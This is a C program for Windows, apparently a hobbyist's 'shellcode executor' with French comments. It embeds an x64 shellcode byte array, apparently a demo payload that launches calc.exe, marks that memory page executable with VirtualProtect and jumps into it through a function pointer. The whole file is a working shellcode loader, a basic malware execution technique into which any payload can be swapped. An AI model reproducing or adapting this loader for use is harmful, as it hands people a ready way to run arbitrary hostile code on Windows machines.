#include <stdio.h>
#include <stdlib.h>
#include <windows.h>



#define BLEU    "\x1b[36m" 
#define ROUGE   "\x1b[31m"  
#define VERT    "\x1b[32m" 
#define JAUNE   "\033[33m"
#define RESET   "\x1b[0m" 

 

void banner()
{
    printf(""ROUGE"##########"RESET"    "VERT"###########"RESET"            "JAUNE"*"RESET" "BLEU"Shellcode Executeur"RESET"\n");
    printf(""ROUGE"##########"RESET"    "VERT"###########"RESET"             "JAUNE"*"RESET" "BLEU"Made By AgentPathogene"RESET"\n");
    printf(""ROUGE"##########"RESET"    "VERT"###########"RESET"              "JAUNE"*"RESET" "BLEU"Octobre 2026"RESET"\n");
    printf(""ROUGE"##########"RESET"    "VERT"###########"RESET"              "JAUNE"*"RESET" "BLEU"No F*** AI code in the payload"RESET"\n");
    printf("                                      "JAUNE"*"RESET" "BLEU"Beginner payload detected by Windef enjoy !"RESET"\n");
    printf("                                                    \n");
    printf(""BLEU"##########"RESET"    "JAUNE"###########"RESET"\n");
    printf(""BLEU"##########"RESET"    "JAUNE"###########"RESET"\n");
    printf(""BLEU"##########"RESET"    "JAUNE"###########"RESET"\n");
    printf(""BLEU"##########"RESET"    "JAUNE"###########"RESET"\n");

}


int main (void)
{
    banner();
    char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f\x87\xff\xd5\xbb\xcd\x64\x9f\x68\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";
    //On va utiliser fonction system pour rendre executable la page memoire ou est le shell code
    //pour ce faire il faux l adresse du tableau
    char *p;
    p = shellcode;
    //recuperer adresse du debut de la page memoire
    int masque = ~4095;
    int *adress_debut_page = (int*) (masque & (uintptr_t)p);
    int page = 4096;
    DWORD ask_by_api;
    printf("%p",adress_debut_page);
    VirtualProtect( 
    adress_debut_page, 
    page, 
    PAGE_EXECUTE_READWRITE, 
    &ask_by_api
    );

    void (*en_parenthese_pour_fairefaussefonction) ();//les parenthese sont barriere de priorite en gros on cree variable ointer qui pointe vers du code executable
    en_parenthese_pour_fairefaussefonction = (void*)p;
    en_parenthese_pour_fairefaussefonction();





    return 0;
}